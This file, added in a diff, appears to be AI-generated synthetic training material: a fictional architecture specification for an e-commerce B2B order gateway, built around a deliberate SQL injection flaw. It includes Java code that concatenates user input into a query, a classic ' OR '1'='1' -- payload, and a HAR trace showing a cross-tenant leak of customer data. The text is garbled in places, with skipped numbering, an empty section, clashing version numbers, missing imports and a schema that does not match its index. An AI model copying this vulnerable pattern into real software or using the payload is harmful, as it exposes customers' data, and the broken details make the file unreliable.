@@ -1,0 +1,243 @@
+========================================
+
+Here is the twenty-fifth system, adhering strictly to the triple-chunk and doubled-size requirements. We are shifting into the **E-commerce & Fraud Detection** sector, focusing on a **B2B Order Fulfillment and Tracking Gateway**.
+
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** ShopFlow B2B Fulfillment Integration Gateway
+**Document Version:** 1.8.0 (FINAL)
+**Classification:** PCI-DSS & MULTI-TENANT CONFIDENTIALITY SCOPE
+**Domain:** E-Commerce / Supply Chain / Third-Party Retail (3PR)
+
+## 1.0 Executive Summary
+ShopFlow is a large-scale e-commerce platform that hosts thousands of independent online retail partners (the "Tenants"). The B2B Gateway serves as the centralized API for these partners to programmatically manage their operations: submitting bulk inventory updates, receiving fraud scores for new orders, and, most critically, retrieving the fulfillment status and customer details for specific orders.
+
+
+## 2.0 Comprehensive Network Topology & Fulfillment Core
+The architecture is designed for high availability and strict tenant data segregation across the entire request lifecycle.
+
+### 2.1 The Edge & API Gateway
+* **Cloudflare WAF:** Provides layer-7 filtering. It contains basic regex rules designed to block simple SELECT * patterns but is bypassed by more advanced injection techniques.
+* **B2B API Gateway (Node.js/TypeScript):** The primary routing service. It validates the inbound JWT and extracts the tenant_id. It routes all fulfillment queries to the backend Order Status Service.
+
+### 2.2 The Backend Order & Ledger Services
+* **Order Status Service (Java/Spring Boot):** The microservice that interfaces directly with the PostgreSQL database. It constructs dynamic SQL queries to handle complex filtering requested by B2B partners, such as filtering by customer_name, order_date, or a custom partner_reference_id.
+* **PostgreSQL (Master Order Ledger):** Contains highly sensitive data, including customer PII (shipping addresses, phone numbers) and tokenized PCI data (last 4 digits of card, payment token). All tables include a mandatory tenant_id column.
+* **Internal Fraud Score Service (gRPC):** A separate, isolated service that provides risk analysis for new orders, consuming data from the Order Ledger.
+
+## 3.0 Identity, Multi-Tenancy, and Access Control
+Tenant isolation is implemented through a combination of JWT claims and parameterized SQL queries.
+
+### 3.1 B2B Partner Authentication (mTLS + JWT)
+Retail partners authenticate using a client certificate (mTLS) and receive a JWT. The JWT contains the immutable partner_id which acts as the tenant_id throughout the system.
+
+### 3.2 Tenant Boundary Enforcement (The Flaw)
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+Internal Security Engineering Note: The partner_reference_id was initially intended only for integer lookups but was changed to a free-form string to support a specific third-party ERP system's unique identifier format. The development team failed to update the prepared statement configuration, allowing string injection. Tracked as RISK-ECOM-044.
+
+**Sub-system:** Order Status Service (`/api/v1/orders/batch-lookup`)
+
+**The Deep Architectural Flaw:**
+This attack chains a parameterized SQL flaw with the architectural assumption of tenant-level security filtering.
+
+1. **SQL Injection (Pattern 5.1):** The Order Status Service receives an optional filter_reference_id field from the client. It uses string concatenation to construct a complex filter clause: AND partner_reference_id = 'USER_INPUT'. The critical flaw is that the application uses simple string concatenation instead of a secure, prepared statement for this specific optional parameter.
+
+WHERE tenant_id = 'ATTACKER_ID' AND partner_reference_id = 'USER_INPUT'
+to:
+WHERE tenant_id = 'ATTACKER_ID' OR '1'='1' -- AND partner_reference_id = '' (the -- nullifies the rest of the query).
+The logical OR '1'='1' evaluates to true for every row in the database, overriding the mandatory tenant_id check and allowing the query to return orders belonging to all other retail partners.
+
+
+1. **The Foothold:** An attacker gains access to a low-tier retail partner account (`tenant_id: "RETAIL_ATTACK"`). They identify the batch order lookup endpoint.
+3. **The Execution:** The attacker submits the request. The Java service constructs the malicious SQL query.
+4. **The Result:** The database executes the query, treating the OR '1'='1' condition as true. The request successfully returns a massive array of orders containing customer PII and tokenized credit card data belonging to the victim retail partners (e.g., RETAIL_VICTIM_01, RETAIL_VICTIM_02).
+
+
+**Document Version:** 3.0.1
+**Applies to Architecture:** ShopFlow B2B Fulfillment Integration Gateway v1.8.0
+
+## 5.0 Master Order Ledger Schema (PostgreSQL)
+
+```sql
+-- 1. Order Header Table
+CREATE TABLE customer_orders (
+order_id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+tenant_id VARCHAR(50) NOT NULL, -- MANDATORY TENANT BOUNDARY
+customer_id UUID NOT NULL,
+order_status VARCHAR(20) DEFAULT 'RECEIVED',
+total_amount DECIMAL(10, 2) NOT NULL,
+created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+);
+
+-- 2. Customer PII and Payment Tokens (Exfiltrated Data)
+CREATE TABLE order_details (
+order_detail_id SERIAL PRIMARY KEY,
+order_id UUID REFERENCES customer_orders(order_id),
+shipping_address TEXT NOT NULL,
+customer_phone VARCHAR(15),
+last_four_card_digits CHAR(4), -- PCI Scope Data
+payment_processor_token TEXT
+);
+
+CREATE INDEX idx_tenant_order ON customer_orders(tenant_id, partner_reference_id);
+```
+
+## 6.0 The Flawed Implementation (Java / Spring Boot)
+
+```java
+package com.shopflow.orderstatus.service;
+
+import org.springframework.stereotype.Service;
+import java.sql.*;
+import java.util.List;
+
+@Service
+public class OrderLookupService {
+private final Connection dbConnection;  
+private static final String BASE\_QUERY =  
+    "SELECT o.order\_id, o.order\_status, d.shipping\_address, d.last\_four\_card\_digits " +  
+    "FROM customer\_orders o JOIN order\_details d ON o.order\_id = d.order\_id ";  
+
+// Executes the core lookup operation  
+public List<OrderResult> lookupOrders(String callingTenantId, List<String> orderIds, String filterRefId) throws SQLException {  
+    
+    // Step 1: Build the dynamic WHERE clause
+    StringBuilder whereClause = new StringBuilder("WHERE o.tenant\_id = ?");  
+    List<String> parameters = new ArrayList<>();  
+    parameters.add(callingTenantId);  
+
+    if (filterRefId \!= null && \!filterRefId.isEmpty()) {  
+        // The user input is concatenated without sanitization or prepared statements.  
+        // Attacker input: ' OR '1'='1' --  
+        whereClause.append(" AND o.partner\_reference\_id = '").append(filterRefId).append("'");  
+        // If the user inputs ' OR '1'='1' --, the final query logic becomes:  
+        // WHERE o.tenant\_id = 'ATTACKER' AND o.partner\_reference\_id = '' OR '1'='1' --'  
+        // ... which simplifies to TRUE for all rows.  
+    }  
+    
+    // Add mandatory filter for the list of requested orders (Pattern 1.9)
+    // This is correctly parameterized, but the OR clause overrides it.
+    String inClause = String.join(",", Collections.nCopies(orderIds.size(), "?"));
+    whereClause.append(" AND o.order\_id IN (").append(inClause).append(")");
+    parameters.addAll(orderIds);
+
+    // Step 2: Prepare and Execute the Statement
+    String finalSql = BASE\_QUERY + whereClause.toString();
+    PreparedStatement ps = dbConnection.prepareStatement(finalSql);
+    
+    // Parameters for the PreparedStatement are only the tenant\_id and the orderIds, 
+    // NOT the filterRefId, as it was concatenated directly into the SQL string.
+    for (int i = 0; i < parameters.size(); i++) {
+        ps.setString(i + 1, parameters.get(i));
+    }
+
+    ResultSet rs = ps.executeQuery();
+    // ... omitted result mapping ...
+    return mapResultSet(rs);
+}
+}
+```
+
+## 7.0 REST API Contracts (The Injection Vector)
+The contract illustrates how a simple, optional filter parameter is abused to rewrite the entire security logic of the SQL query, granting cross-tenant read access.
+
+### 7.1 Intended Safe Payload (Legitimate Order Lookup)
+A retailer looks up the status of a single order using their custom tracking ID.
+
+**Target URI:** `POST /api/v1/orders/batch-lookup`
+**Expected Request Payload:**
+```json
+{
+"order_ids": ["88192a-44f2-8921-b3c4"],
+"filter_reference_id": "ERP-TRACKING-10045"
+}
+```
+
+
+**Target URI:** `POST /api/v1/orders/batch-lookup`
+**Malicious Request Payload:**
+```json
+{
+"order_ids": ["88192a-44f2-8921-b3c4"],
+"filter_reference_id": "' OR '1'='1' --"
+}
+```
+*Behavior:* The executed SQL query effectively becomes: SELECT ... FROM customer_orders ... WHERE o.tenant_id = 'ATTACKER_ID' OR '1'='1' ... The query returns every order in the database, including all victim tenants' customer PII and tokenized card data.
+
+
+**Applies to Architecture:** ShopFlow B2B Fulfillment Integration Gateway v1.8.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 5.1 & Pattern 1.9)
+
+This HTTP Archive (HAR) trace captures the attacker's successful cross-tenant data exfiltration via an SQL injection that bypasses the multi-tenant WHERE clause. The attacker, authenticated as a low-value partner (RETAIL_ATTACK_99X), sends a POST request to the bulk lookup endpoint.
+
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Cloudflare WAF / Spring Boot APM Logs",
+"version": "1.8.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-09 T17:15:33.411Z",
+"time": 450,
+"request": {
+"method": "POST",
+"url": "https://api.shopflow-b2b.com/api/v1/orders/batch-lookup",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.shopflow-b2b.com" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJQRVJfO" },
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-partner-id", "value": "RETAIL_ATTACK_99X" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"order_ids\": [\"88192a-44f2-8921-b3c4\"], \"filter_reference_id\": \"' OR '1'='1' --\"}"
+},
+"bodySize": 105
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-db-query-time-ms", "value": "390" }
+],
+"content": {
+"size": 8500000,
+"mimeType": "application/json",
+"text": "{\"status\": \"SUCCESS\", \"total_orders\": 45180, \"orders\": [{\"order_id\": \"88192a-44f2-8921-b3c4\", \"tenant_id\": \"RETAIL_ATTACK_99X\", \"shipping_address\": \"123 Main St...\", \"last_four_card_digits\": \"4444\"}, {\"order_id\": \"991a2b-88c4-11d2-00f1\", \"tenant_id\": \"RETAIL_VICTIM_01\", \"shipping_address\": \"456 Oak Ave...\", \"last_four_card_digits\": \"1234\"}, {\"order_id\": \"a1b2c3-d4e5-f6a7-b8c9\", \"tenant_id\": \"RETAIL_VICTIM_02\", \"shipping_address\": \"789 Pine Ln...\", \"last_four_card_digits\": \"9012\"}...]}"
+},
+"bodySize": 8500000
+}
+}
+]
+}
+}
+```
+
+### Why this payload is critical for training a 3B model (Expanded Analysis):
+
+
+* **Volume Anomaly:** The reported total_orders: 45180 and content.size: 8500000 (8.5 MB) demonstrate that the attacker achieved a bulk export (Pattern 1.9) rather than a targeted one-off leak, escalating the severity to a major confidentiality breach.
+
+3. **PII and PCI Data Risk:**
+* **Semantic Payload Analysis:** The model must recognize that the exfiltrated data includes sensitive PII (shipping_address) and tokenized PCI data (last_four_card_digits). The combination of a massive bulk export and the leakage of regulated financial data increases the severity score significantly due to compliance requirements (PCI-DSS, GDPR).
+
+4. **Execution Artifacts:**
+* The x-db-query-time-ms: 390 is high, confirming that the injected SQL query executed the full, resource-intensive table scan on the PostgreSQL database, further confirming the successful query rewrite and execution.
+
+========================================
+========================================
+
+========================================
+========================================
+
+========================================
